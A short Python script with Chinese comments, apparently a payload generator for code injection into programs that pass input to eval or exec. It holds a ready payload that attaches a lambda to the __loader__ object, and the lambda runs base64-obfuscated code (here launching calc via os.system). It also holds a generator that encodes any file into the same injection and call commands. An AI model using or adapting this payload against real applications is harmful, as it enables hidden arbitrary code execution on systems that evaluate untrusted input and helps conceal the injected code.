#by leeya_bug

#写入代码到__loader__中
#适用于eval、exec等函数

#Payload: 
if False:
    #植入代码
    setattr(__loader__,'ZzRTSoDE',lambda :exec(__import__('base64').b64decode('aW1wb3J0IG9zCm9zLnN5c3RlbSgnY2FsYycpCgpmb3IgaSBpbiByYW5nZSgwLCAxMCk6CiAgICBwcmludChpKQ==')))
    #调用代码
    __loader__.ZzRTSoDE()

#Payload生成
FUNC_NAME = 'ZzRTSoDE'

import base64
path = input('请输入要写入的代码文件路径(默认test.py): ')
path = path if path != '' else 'test.py'
with open(path, 'r') as f:
    a = f.read()
a0 = base64.b64encode(a.encode()).decode()
print('写入动态代码命令: ')
print(f'''setattr(__loader__,'{FUNC_NAME}',lambda :exec(__import__('base64').b64decode('{a0}')))''')
print('调用动态代码命令: ')
print(f'''__loader__.{FUNC_NAME}()''')